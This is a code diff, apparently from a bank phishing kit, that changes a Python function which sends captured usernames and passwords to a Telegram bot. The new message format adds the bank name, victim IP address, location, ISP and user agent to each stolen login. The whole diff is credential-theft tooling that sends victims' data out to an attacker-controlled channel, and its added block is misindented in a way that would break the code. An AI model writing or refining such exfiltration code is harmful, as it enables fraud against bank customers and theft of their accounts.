@@ -78,12 +78,23 @@ def send_to_telegram(username, password):
         print("⚠️ Telegram not configured")
         return
 
-    message = (
-        "🔔 New Login\n"
-        "━━━━━━━━━━━━━━━\n"
-        f"👤 Username: {username}\n"
-        f"🔑 Password: {password}"
-    )
+   message = (
+    "====================\n"
+    f"{BANK_NAME}\n"
+    "++++++++++++++++++++\n"
+    f"{date}\n"
+    f"domain: {domain}\n"
+    f"{country}|{region}|{city}|{lang}|{isp}|\n"
+    f"ip: {ip}\n"
+    f"ua: {user_agent}\n"
+    "\n"
+    f"Username : {username}\n"
+    f"Password : {password}\n"
+    "\n"
+    "\n"
+    "++++++++++++++++++++\n"
+    "===================="
+)
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = urllib.parse.urlencode({
